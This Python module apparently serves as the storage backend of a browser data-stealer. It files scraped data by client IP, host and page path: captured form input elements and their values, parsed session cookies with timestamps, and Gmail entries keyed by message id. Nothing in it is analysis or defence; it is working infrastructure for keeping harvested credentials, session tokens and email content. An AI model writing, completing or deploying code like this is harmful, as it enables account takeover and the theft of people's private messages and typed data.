from enum import Enum
from typing import Any, Dict, List, Tuple, TypedDict
from urllib.parse import urlparse

class ScrapeTypeEnum:
    INPUTS = "inputs"
    COOKIES = "cookies"
    GMAIL = "gmail"

class ScrapeRequestDataType(TypedDict):
    href: str
    type: ScrapeTypeEnum
    time: int
    data: List[Dict[Any, Any]]


class ElementType(TypedDict):
    tag: str
    attributes: List[Tuple[str, str]]
    value: str

class CookieType(TypedDict):
    value: str
    last_updated: int

class DataCollectionType(TypedDict):
    inputs: List[Tuple[int, str, List[ElementType]]]
    cookies: Dict[str, CookieType]
    href: List[Tuple[int, str]]

def newDataCollectionType() -> DataCollectionType:
    return DataCollectionType(inputs=[], cookies={}, href=[])

StorageDataType = Dict[str, Dict[str, Dict[str, DataCollectionType]]]

class Storage:
    def __init__(self) -> None:
        self.__data: StorageDataType = {}

    def to_json(self) -> StorageDataType:
        return self.__data

    def save(self) -> None:
        pass

    def store(self, ip: str, data: ScrapeRequestDataType) -> None:
        # store a request data into the storage
        if ip not in self.__data:
            self.__data[ip] = {}
        
        # create a new entry for this host and path
        url = urlparse(data["href"])
        if url.netloc not in self.__data[ip]:
            self.__data[ip][url.netloc] = {}
        if url.path not in self.__data[ip][url.netloc]:
            self.__data[ip][url.netloc][url.path] = newDataCollectionType()

        # check the type
        if data["type"] == ScrapeTypeEnum.INPUTS:
            for element in data["data"]:
                self.__data[ip][url.netloc][url.path]["inputs"].append((
                    data["time"],
                    data["href"],
                    element,
                ))

        elif data["type"] == ScrapeTypeEnum.COOKIES:
            for cookie in data["data"][0].split(";"):
                # clean the cookie and update its value
                key, value = cookie.lstrip(" ").split("=", 1)
                self.__data[ip][url.netloc][url.path]["cookies"][key] = {
                    "value": value,
                    "last_updated": data["time"],
                }
            self.__data[ip][url.netloc][url.path]["href"].append((
                data["time"],
                data["href"],
            ))

        elif data["type"] == ScrapeTypeEnum.GMAIL:
            # special scrape, store directly on the ip
            if "gmail" not in self.__data[ip]:
                self.__data[ip]["gmail"] = {}
            
            # go through each piece of data given and add update its store
            for entry in data["data"]:
                id = entry["id"]
                if id not in self.__data[ip]["gmail"]:
                    self.__data[ip]["gmail"][id] = {}

                self.__data[ip]["gmail"][id].update(entry)
                


